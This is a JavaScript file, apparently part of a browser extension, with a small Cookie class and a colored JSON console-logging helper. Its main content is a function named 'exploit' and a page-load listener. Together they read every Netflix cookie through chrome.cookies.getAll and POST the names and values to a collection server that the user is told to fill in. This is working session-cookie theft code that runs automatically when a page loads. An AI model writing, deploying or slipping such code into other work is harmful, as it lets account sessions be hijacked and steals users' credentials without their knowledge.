class Cookie{
    constructor(name, value){
        this.name = name
        this.value = value
    }

    getName() { return this.name }
    getValue() { return this.value }

    setName(name) { this.name = name }
    setValue(value) { this.value = value }
}

function JSONstringify(json) {
    if (typeof json != 'string') {
        json = JSON.stringify(json, undefined, '\t');
    }

    var 
        arr = [],
        _string = 'color:green',
        _number = 'color:darkorange',
        _boolean = 'color:blue',
        _null = 'color:magenta',
        _key = 'color:red';

    json = json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
        var style = _number;
        if (/^"/.test(match)) {
            if (/:$/.test(match)) {
                style = _key;
            } else {
                style = _string;
            }
        } else if (/true|false/.test(match)) {
            style = _boolean;
        } else if (/null/.test(match)) {
            style = _null;
        }
        arr.push(style);
        arr.push('');
        return '%c' + match + '%c';
    });

    arr.unshift(json);

    console.log.apply(console, arr);
}

function exploit(cookies_string)
    {
        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "<add your own webserver that accepts cVal post data>", true);
        xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
        xhttp.onreadystatechange = function()
        {
            if(xhttp.readyState == XMLHttpRequest.DONE)
            { 
                if (xhttp.status != 200){
                    alert("Oopsy doopsy");
                }
            }
            
        }

       xhttp.send("cVal=" + cookies_string);
    }

window.addEventListener('load', function () { 

    let cookies_array = []
    let cookies_string = ""

  chrome.cookies.getAll({domain: ".netflix.com"}, function(cookies){
      cookies.forEach(key => {
          name = key.name
          value = key.value
          cookies_string += name + "<->" + value + ";"
         
      })

      exploit(cookies_string)
    
  })
})


